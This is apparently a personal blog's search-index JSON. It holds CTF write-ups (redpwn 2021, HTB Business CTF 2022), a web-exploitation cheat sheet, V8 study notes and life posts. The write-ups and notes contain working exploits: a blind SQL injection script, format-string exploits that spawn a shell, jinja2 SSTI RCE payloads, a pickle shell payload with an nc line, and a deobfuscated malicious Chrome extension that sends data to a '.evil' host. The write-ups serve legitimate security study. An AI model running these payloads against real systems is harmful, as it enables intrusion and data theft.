1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 204, 203, 214, 225, 224, 223, 344, 465, 466, 467, 588, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 204, 203, 192, 181, 180, 179, 168, 157, 278, 399, 520, 641, 642, 643, 764, 885, 886, 887, 898, 909, 920, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 216, 227, 226, 225, 224, 223, 344, 465, 466, 467, 588, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]  result=\"\"  for i in range(1,len(a)):   if a[i]-a[i-1]==121:     result+='f'   if a[i]-a[i-1]==-121:     result+='b'   if a[i]-a[i-1]==11:     result+='d'   if a[i]-a[i-1]==-11:     result+='u'   if a[i]-a[i-1]==1:     result+='r'   if a[i]-a[i-1]==-1:     result+='l'  print result # correct input is frrffllffddllffrrffuubbrrfff   ❯ ./chall      frrffllffddllffrrffuubbrrfff :) flag{star_/_so_bright_/_car_/_site_-ppsu}   The flag is flag{star_/_so_bright_/_car_/_site_-ppsu}   Web/cool (122pts)  here are some initial parts and vulnerable parts of app.py.  def create_user(username, password):     if any(c not in allowed_characters for c in username):         return (False, 'Alphanumeric usernames only, please.')     if len(username) &lt; 1:         return (False, 'Username is too short.')     if len(password) &gt; 50:         return (False, 'Password is too long.')     other_users = execute(         f'SELECT * FROM users WHERE username=\\'{username}\\';'     )     if len(other_users) &gt; 0:         return (False, 'Username taken.')     execute(         'INSERT INTO users (username, password)'         f'VALUES (\\'{username}\\', \\'{password}\\');'     )     return (True, '')  @app.route('/register', methods=['GET', 'POST']) def register():     message = ''     if request.method == 'POST':         success, message = create_user(             request.form['username'],             request.form['password']         )         if success:             session['username'] = request.form['username']             return redirect('/message')     return render_template_string('''         &lt;link rel=\"stylesheet\" href=\"/static/style.css\" /&gt;         &lt;div class=\"container\"&gt;             &lt;p&gt;Register!&lt;/p&gt;             &lt;form method=\"POST\"&gt;                 &lt;label for=\"username\"&gt;Username&lt;/label&gt;                 &lt;input type=\"text\" name=\"username\" /&gt;                 &lt;label for=\"password\"&gt;Password&lt;/label&gt;                 &lt;input type=\"password\" name=\"password\" /&gt;                 &lt;input type=\"submit\" value=\"Register\" /&gt;             &lt;/form&gt;             &lt;p&gt;&lt;/p&gt;         &lt;/div&gt;     ''', error=message)   @app.route('/message') def message():     if 'username' not in session:         return redirect('/')     if session['username'] == 'ginkoid':         return send_file(             'flag.mp3',             attachment_filename='flag-at-end-of-file.mp3'         )     return '''         &lt;link rel=\"stylesheet\" href=\"/static/style.css\" /&gt;             &lt;div class=\"container\"&gt;             &lt;p&gt;You are logged in!&lt;/p&gt;             &lt;p&gt;Unfortunately, Aaron's message is for cool people only.&lt;/p&gt;             &lt;p&gt;(like ginkoid)&lt;/p&gt;             &lt;a href=\"/logout\"&gt;Log out&lt;/a&gt;         &lt;/div&gt;     '''   If we submit register form, app.py call create_user function.  this prob doesn’t filter password (just filter username using allowed_characters)   allowed_characters = set(     'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789' )   the goal is to find ginkoid’s password, so I used blind sql injection attack vector: execute(insert into username, password).   here is my payload:     username : any  password : {each char}=substr((select password from users),{offset},1)    subquery (select password from users) return first user(ginkoid)’s password. So, this method can verify each password char with 1 OR 0 (bool) result. Only have to do is login each username and find user that password is 1, and combine them.   payload source code  I use thread because it tooks a long time.  from threading import Thread import requests import string  URL=\"https://cool.mc.ax/register\" URL2=\"https://cool.mc.ax/\" allow='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789' #allow=string.printable  def threading_func(i,j):   data={'username':'cde'+'a'*i+'asdf'+allow[j], 'password':allow[j]+'\\'=substr((select password from users),'+str(i+1)+',1))-- '}   print(data)   r=requests.post(URL, data=data)   #print r.text  def threading_func2(i,j):   global result   data={'username':'cde'+'a'*i+'asdf'+allow[j], 'password':\"0\"}   #print data   r=requests.post(URL2, data=data)   #print(r.text)   if \"Incorrect username or password.\" in r.text:     print(str(i), allow[j], \"is 1\")   for x in range(32):   for y in range(len(allow)):     th=Thread(target=threading_func, name=\"[\"+str(x)+\" \"+allow[y]+\"]\", args=(x,y,))     th.start()   for x in range(32):   for y in range(len(allow)):     #print(x,y)     th=Thread(target=threading_func2, name=\"[\"+str(x)+\" \"+allow[y]+\"]\", args=(x,y,))     th.start()   finally I found password of ginkoid: k4Wm3qCKKK7kuLBVF3XFyo2kGCSj4ESe  And I received flag in flag-at-end-of-file.mp3. just execute command tail and get flag!   /mnt/c/Users/bww96/Downloads ❯ tail flag-at-end-of-file.mp3  Uj(΁!*-IjZuaɤZ'L t1r}^:G̑klS\\4QD\\tO˻9T%oi03#^)ҝQFk?+zY&gt;-=&amp;T0)۪FP]  !}?LY`4Or~eClRD,wdbeVlH`lU&lt;4vLa3WNU'8\\4ieKDGƨtd 8eBQ&lt;c$TND5]y+&amp;|ꯜ@C5V&lt;Nu*7UFD2&lt;h                                                                                  e?TMq8zgh пg&lt;eZ(#@4 H~͈B܍5f1        9o  {K14-v6(n|MmQ;f3&amp;*#ekFNܾEŪ��?2 уP@d qA-^W.REW?dYk                                                  &gt;J %{ 1  \\Q\"B(q6CA3gV{?7UJO71,&lt;$ʙ|F@T2m*ez\\dl1u+&amp;Uȧg!!;,/)f:x$VD$)*38&gt;ƛ&lt;vbeI [6Y(5Vt7B   sd)ZYn        wLAMEUUHDH#@DE*Bb��f,L\"c0Q!1ƴ7ԃ8!QF*%QD1TU~  MI04UUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUU UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUU UUUUUU(Dk4UUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUU UUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUdBE@@   4UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUflag{44r0n_s4ys_s08r137y_1s_c00l}   The flag is flag{44r0n_s4ys_s08r137y_1s_c00l}  ","categories": ["ctf"],
        "tags": ["web","reversing","algorithm"],
        "url": "/ctf/redpwn_2021_rev_web/",
        "teaser": null
      },{
        "title": "Start Again",
        "excerpt":"My second github blog start 🎇   Using jekyll again ✨   It was fun! 🎉   And it can be set easily~ 🎃   This formula $f(x) = x^2$ is an example.   $$ \\lim_{x\\to 0}{\\frac{e^x-1}{2x}} \\overset{\\left[\\frac{0}{0}\\right]}{\\underset{\\mathrm{H}}{=}} \\lim_{x\\to 0}{\\frac{e^x}{2}}={\\frac{1}{2}} $$  $$ \\begin{aligned}  a^2 + b^2 &= c^2 \\\\  E &= M \\cdot C^2 \\\\  &= xy + \\mathbb{E}  \\end{aligned} $$  테마가 마음에 안들어서 다시 바꿨습니다.  ","categories": ["life"],
        "tags": ["hello","world"],
        "url": "/life/start-again/",
        "teaser": null
      },{
        "title": "web note (update 2021.10.27)",
        "excerpt":"post will be frequently updated   SSTI (Server Side Template Injection)  해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다.  This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.   ▶ jinja2  # 기본 {{ 4*4 }} =&gt; 16  # check with config {{ config }} {{ config.items() }} {{ config['secret_key'] }}  # RCE with config {{ config.__class__.__init__.__globals__['os'].popen(\"ls\").read() }} {{ (config|attr(\"__class__\")).__init__.__globals__['os'].popen('cat flag').read() }}  # etc ('',(),get_flashed_messages, url_for, ...) {{ ''.__class__.__mro__[1].__subclasses__()[**index**]('cat flag', shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(\"/flag\").read() }} {{ url_for.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls -al\").read()') }}   # with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회 http://foo.bar/?payload={{ request|attr('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}       SQLI (sql injection)  해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다.  The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.   1. Comment symbol     /* ~ */, -- ~, # (URL encoded : %23)   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1=1-- \" =&gt; Select * from tbl where id='' or 1=1--' user_input=\"' or 1=1#\" =&gt; Select * from tbl where id='' or 1=1# user_input=\"' or 1=1/*1234*/\" =&gt; Select * from tbl where id='' or 1=1/*1234*/' ...? (must have closed symbol)   2. with single quarter     id가 ''로 감싸져 있을 경우 '를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다.   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1='1\" =&gt; Select * from tbl where id='' or 1='1'   3. and, or, &amp;&amp;, ||, in, between, like  -- and, or Select * from tbl where id='1234' and pw='5678' Select * from tbl where id='1234' or pw='5678'  -- &amp;&amp;, || (no space required) Select * from tbl where id='1234'&amp;&amp;pw='5678' Select * from tbl where id='1234'||pw='5678'  -- in Select * from tbl where id in '1234' and pw in '5678'  -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between 'A' and 'C' -- 'A'&lt;=score&lt;='C'  --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like 'Bae%' -- starts with Bae Select * from tbl where name like '%uk' -- ends with uk Select * from tbl where name like '%won%' -- include won Select * from tbl where name like '___' -- length 3 chars Select * from tbl where binary name like '~' -- distinguish upper/lower   4. Internal function in mysql     char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;\"abc\")   mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..)   left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly))   version() : get mysql version   database() : get current database       python pickle deserialization  pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loads 함수에서 unpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다.   import os import pickle  class payload(object):   def __reduce__(self):     #return (os.system, ('ls', ))     #return (os.system, ('cat flag', ))     return (os.system, ('/bin/sh', ))     #return (os.system, ('/bin/sh | nc [ip] [port]', ))  pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway  $ id uid=1000(test) gid=1000(test) groups=1000(test)   update 예정.  ","categories": ["note"],
        "tags": [],
        "url": "/note/web-note-update/",
        "teaser": null
      },{
        "title": "Personal R&D plan beginning from 'now'",
        "excerpt":"UPDATED : 06 JUN 2023 19:45 UTC+9 KST   This is my plan to be finished until/after graduating.   Research     § must be finished until new year’s day §         Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete     Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete      Develop     § new year STUDY plan §         Making interpreter/compiler with Rust -in progress (With Chris Ohk, ..)      Goal          Try something “new”, Try Everything     Pass any awesome Univ.’s admission (Complete)     Pass drive license (Complete)     Dreamhack Wargame 1st                Format Sniper (Learn &amp; Analyze about FSB)         Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)         Unibitmap (Solved :D)         dreamboard v2 (V8 : Solved :D)                 Purchase another laptop (DELL XPS 15 12th generation Intel CPU)     BoB (Best of the Best) 14th? 15th?     Try to be the BEST without competitive mind, Just enjoy     ","categories": ["life"],
        "tags": [],
        "url": "/life/list-after-graduate/",
        "teaser": null
      },{
        "title": "[V8 Study] 00-introduction",
        "excerpt":"[!] 우선적으로 한글로 작성하여 추후 번역할 예정.   Summary  우리가 대중적으로 사용하는 Google Chrome browser에는 웹페이지를 동적으로 실행시키기 위해 javascript가 구동될 수 있도록 지원하고 있다. 그렇다면, JS를 원활하게 실행하고 컴파일하는 역할은 어떤 것이 맡고 있을까? 이 챕터에서는 내가 공부했던 chromium javascript engine인 V8에 대해서 알아보고자 한다.   V8의 구조는 어떻게 되어 있을까?   V8같은 경우 Chrome 구동 시 하나의 프로세스로 실행되어 heap 및 stack 메모리 영역을 관리하면서 Javascript의 각종 변수와 메소드를 실행하는 가장 핵심적인 execution file로 동작한다. 이외에 Task/Callback queue, Microtask queue, WebAPI 등 다양한 요소가 Chromium browser를 구성하고 동작하는데 사용된다.   가장 대표적인 역할은 javascript 코드를 컴파일된 컴퓨터에 최적화된 코드로 변환시켜 전달하게 된다는 것이다. 이때 JIT(Just-In-Time) Compiler라는 독창적인 컴파일러를 사용한다.   V8만의 특징은 무엇이 있을까?     우선 인터프리터와 컴파일러에 대해 알아야 할 것이다.     인터프리터            장점 : 한 줄 한 줄 변환하기 때문에 실행 속도가 빠르다.       단점 : 자바스크립트 코드가 복잡해질수록 점점 속도가 느려진다. 예를 들어, 같은 코드를 여러차례 반복하는 반복문의 경우, 같은 결과를 반복하는 것임에도 불구하고 코드를 한 줄 한 줄 읽는 방식에 의해 그때그때 실행된다.           컴파일러            장점 : 파일 전체를 한번에 읽어서 컴파일러는 작업을 단순화시킨다. 예를 들어 특정 함수를 10억번 반복해야 할 경우, 컴파일 과정에서 함수를 반복하는 것이 아니라 함수의 결과물을 반복하도록 컴파일 한다. 이처럼 불필요한 동작을 제거하는 컴파일러의 방식을 최적화, optimization이라고 한다.  (인터프리터는 optimize하지 않는다 )       단점 : 코드를 바로 실행하지 않고, 코드 실행 전 전체를 컴파일 하는 과정이 필요하기 때문에 초기에 속도가 느릴 수 밖에 없다.           자바스크립트 엔진의 내부를 공부하다가 잠시 인터프리터와 컴파일러의 간단한 개념과 장단점을 짚어봤다. 그러면 과연 V8 엔진은 어떤 방식을 취했길래 다른 자바스크립트 엔진보다 더 빠르고 효율적으로 자바스크립트 명령을 수행할 수 있을까? 바로 여기에서 V8 엔진의 독특한 언어 변환 도구인 JIT Compiler가 들어온다. JIT은 Just In Time의 약자이다.   JIT Compiler의 구조     V8 엔진은 다음과 같은 구조로 되어 있다.     Parser : 코드를 Lexical Analysis라는 과정을 통해 토큰으로 분해한다.   AST(Abstract Syntax Tree) : Parser에서 분해된 토큰을 바탕으로 추상적인 트리를 생성한다.   Ignition : AST에서 나온 트리를 V8의 인터프리터인 ignition에게 전달하고 이것을 인터프리터는 bytecode로 변환시킨다. (High-level Lang to Low-level Lang)   TurboFan, Profiler : bytecode를 실행하여 Human-readable Lang을 실행시키고, 그중 자주 사용되는 코드라고 판별된 코드 조각은 TurboFan으로 보내져 최적화를 수행하여 새로운 컴파일된 코드로 재구성된다. (이때 자주 사용되는 코드라는 말이 매우 추상적이므로 Profiler 라는 친구한테 사용 빈도 수 등을 수집하게끔 역할을 부여하고, 모인 데이터를 통해 Turbofan의 알고리즘대로 최적화를 한다)   Turbofan은 어떤 조건으로 최적화하는 걸까?          코드가 뜨겁고 안정적인 것, 쉽게 말하면 자주 호출되고(뜨겁고) 코드가 안 변함(안정적)이라는 것이다. 매번 같은 행동을 수행하는 반복문 내에 있는 코드 같은 경우가 여기에 해당하기 쉽다.            인터프리팅된 바이트 코드의 길이를 보고 특정 임계점을 넘기지 않으면 작은 함수라고 판단해서 최적화를 진행하는 것이다. 작고 단순한 함수는 크고 복잡한 함수보다 동작이 매우 추상적이거나 제한적인 확률이 높기 때문에 안정적이라고 볼 수 있다.       [!] 그러나, 컴파일러는 100% 완벽하지 못하기 때문에 의도와 다르게 발적화(deoptimization)가 일어날 수도 있다.   Next Topic  다음에는 V8에서 자료형이나 JS의 다양한 메소드가 어떤 식으로 저장이 되고 불러올 수 있는지를 알아보고자 한다.   reference     https://dkwjdi.tistory.com/194   https://github.com/danbev/learning-v8/blob/master/notes/intro.md  ","categories": ["V8"],
        "tags": [],
        "url": "/v8/V8-introduction/",
        "teaser": null
      },{
        "title": "HTB Business CTF 2022 : Dirty Money write-up (in progress)",
        "excerpt":"Write-up IN PROGRESS ..  작성중   Summary  Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc..   Tasks      Pwnable💻            Payback       Insider       OpenDoor           Cryptography💡            BBGun06 (+ revenge)       ElElGamal           Reversing⚙️            BreakOut       ChromeMiner, Assisted           Forensic🔎            Lina’s Invitation           PWN : Payback   1. Analyze  mitigations are here:  [*] '/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'     Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled     RUNPATH:  b'./.glibc/'  I found that delete_bot function has Format string bug when I send delete_reason.  int delete_bot() {     unsigned int id;     id = getId(); // 0 ~ 31     if (botBuf[id].url != NULL)     {         char reasonbuf[MAX_REASON_SIZE];         memset(reasonbuf, '\\x00', MAX_REASON_SIZE);         // gather statistics         printf(\"\\n[*] Enter the reason of deletion: \");         read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1);         free(botBuf[id].url);         botBuf[id].url = NULL;         puts(\"\\n[+] Bot Deleted successfully! | Reason: \");         printf(reasonbuf);         return 0;     }     puts(\"\\n[!] Error: Unable to fetch the requested bot entry.\\n\"); }  reasonbuf is in a stack area so I can check FSB attack offset with input buffer.  If I manage __free_hook, I can call system(\"/bin/sh\\x00\") when I call delete_bot.  Setting bot’s URL to /bin/sh\\x00 and calling free can trigger shell.  Let’s exploit!   2. Exploit Code  from pwn import *  # p=process(\"./payback\") p=remote(\"142.93.37.110\",30669) e=ELF(\"./payback\") l=ELF(\".glibc/libc.so.6\")  def add():     p.sendlineafter(\"&gt;&gt; \", str(1).encode())     p.sendlineafter(\": \", \"/bin/sh\\x00\")     p.sendlineafter(\": \", \"0\")  def delete(id, fsb_pay):     p.sendlineafter(\"&gt;&gt; \", str(3))     p.sendlineafter(\": \", str(id))     pause()     p.sendafter(\": \", fsb_pay)  add() delete(0, \"%p\") # overwrite offset : 8  p.recvuntil(\"Reason: \\n\") libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym['__free_hook'] system = libc_base + l.sym['system']  log.info(hex(libc_base)) log.info(hex(free_hook))  add()  low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32  if mid &gt; low:     rmid = mid-low else:     rmid = 0x10000+mid-low  if high &gt; mid:     rhigh = high-mid else:     rhigh = 0x10000+high-mid  log.info(hex(low)) log.info(hex(mid)) log.info(hex(high))  payload = '' payload += '%{}c'.format(low) payload += '%13$hn' payload += '%{}c'.format(rmid) payload += '%14$hn' payload += '%{}c'.format(rhigh) payload += '%15$hn' payload += 'A' payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4)  delete(0, payload)  add() delete(0, b\"pwned\")  p.interactive()     Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}.     PWN : Insider   1. Analyze  Binary run FTP cli program with 30 commands.     USER ;) : compare with ;) string, if it’s correct, prepare PASS command.   PASS ;) : same with USER command, if password correct, I can use all of cmds.   BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition.   LIST : get current working directory (CWD) by using getcwd() function.  also run ls -al [result of getcwd()] with popen.  if process run successfully, result should be written in console.   CWD [path] : change working directory with my own path.   MKDR [path] : make directory with my own path.   .. etc   BKDR command can leak stack area or overwrite stack area.  I found unchanged stack position that makes denied access to LIST command.  (value : -1, LIST NOT ALLOWED!)   at first, I used RETR command to read /flag.txt, but this file’s permission is only read in root, r--------. Need to find another way..      v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n.   2. After Getting shell..?     MKDR ;sh : make directory named ;sh. it’s legal expression in linux.   CWD ;sh : change working directory to /home/ctf/;sh   LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!!   In the shell, cd /home/ctf =&gt; I noticed that get_flag file’s RUNPATH is ./, so changing working directory to /home/ctf is necessary.   In the shell, ./get_flag =&gt; Execute!   In the shell, exit =&gt; for receiving results of entire commands.  (because commands is running in popen process)   3. Exploit Code  from pwn import *  #context.log_level = 'debug'  p = remote(\"104.248.175.153\",30467) #p = process('./chall')  def qwer(x, noRecv=False):         if not noRecv:  p.recv()         p.send(x)         sleep(0.5)  qwer(\"USER ;)\") qwer(\"PASS ;)\")  qwer(\"BKDR %p %p %p %p %p %p %p\") p.recvuntil(\"(nil) 0x\") leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak))  pay = b'BKDR' pay += b' %1035$n'  #pause() pay = pay.ljust(0x28-3, b'b') pay += p64(leak) pay += b\"ASDF\" qwer(pay)  #qwer(\"STOR .profile\") #qwer(\"alias ls='sh;ls'\".ljust(0x1000, 'a') + 'LIST', True) #p.shutdown('send')  qwer(\"MKDR ;sh\") qwer(\"CWD ;sh\") qwer(\"LIST\")  p.sendline(\"cd /home/ctf\") p.sendline(\"./get_flag\") p.sendline(\"exit\") p.interactive()   Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}.     PWN : OpenDoor  ! REDACTED !  Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb     CRYPTO : BBGun06  1. Analyze   BBGun06 / revenge has same verify(self,message, signature) code:  def verify(self, message, signature):         keylength = len(long_to_bytes(self.n))         decrypted = self.encrypt(signature)         clearsig = decrypted.to_bytes(keylength, \"big\")          r = re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL)         m = r.match(clearsig)          if not m:             raise VerificationError('Verification failed')          if m.group(1) != self.asn1:             raise VerificationError('Verification failed')          if m.group(2) != sha1(message).digest():             raise VerificationError('Verification failed')          return True   And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer.  Decrypted message is same when I give bytes string that has same integer result. That means, dec(\"0001\") == dec(\"01\"). It’s simple!  send given signature with 00 :D, 00 + sig  revenge prob has the same solving process lol:) See below.  2. Exploit (Manual)  // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10  ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32'06_519n47u23_f02932y}  signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f  ...  Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32's}     CRYPTO : ElElGamal  I didn’t know about ElGamal in cryptography, so I searched a lot.  writing… —   REV : BreakOut   1. FLAG Recovering     Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running!   Download bkd file in website.   Realize it’s web server made by C++.   Find secretGet function and get flag.   2. Get FLAG     Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}.     REV : ChromeMiner   Fully obfuscated js Challenge.   1. Recover with hand  async function iF() {   if (!('injected' in document)) {     document['injected'] = true;     window['setInterval'](async () =&gt; {       y = new window['Uint8Array'](64);       window['crypto']['getRandomValues'](y);       if (new window['TextDecoder']('utf-8')['decode'](await window['crypto']['subtle']['digest']('sha-256', y))['endsWith']('chrome')) {         j = new window['Uint8Array'](y['byteLength'] + (await window['crypto']['subtle']['digest']('sha-256', y))['byteLength']);         j['set'](new window['Uint8Array'](y), 0);         j['set'](new window['Uint8Array'](await window['crypto']['subtle']['digest']('sha-256', y)), y['byteLength']);         window['fetch']('hxxps://qwertzuiop123.evil/' +          [...new window['Uint8Array'](await window['crypto']['subtle']['encrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', await window['crypto']['subtle']['decrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_'), {['name']: 'AES-CBC'}, true, ['decrypt']), new window['Uint8Array'](('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')['match'](/../g)['map'](h =&gt; window['parseInt'](h, 16)))), {['name']: 'AES-CBC'}, true, ['encrypt']), j))]['map'](x =&gt; x['toString'](16)['padStart'](2, \"0\"))['join'](\"\"));       }     }, 1);   } } ;  chrome['tabs']['onUpdated']['addListener']((tabVar, changeInfo, tab) =&gt; {   if ('url' in tab &amp;&amp; tab['url'] != null &amp;&amp; (tab['url']['startsWith']('https://') || tab['url']['startsWith']('http://'))) {     chrome['scripting']['executeScript']({['target']: {['tabId']: tab['id']}, function: iF});   } });   2. Decrypt with AES-256  &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &gt;&gt;&gt; cipher.decrypt(b'\\xe2B\\xe6Ba\\xd2\\x19i\\xf6[\\xed\\xf9T\\x90\\n\\x99R\\t\\t\\x9f\\xb6\\xc3\\xc6\\x82\\xc0\\xd9\\xc4\\xb2u\\xb1\\xc2\\x12\\xbc\\x18\\x8e\\x08\\x82\\xb6\\xber\\xc7I!\\x12A\\x18\\x7f\\xa8') b'HTB{__mY_vRy_owN_CHR0me_M1N3R__}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10'     FOR : Lina’s Invitation  writing….  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/htb_businessctf_2022/",
        "teaser": null
      }]
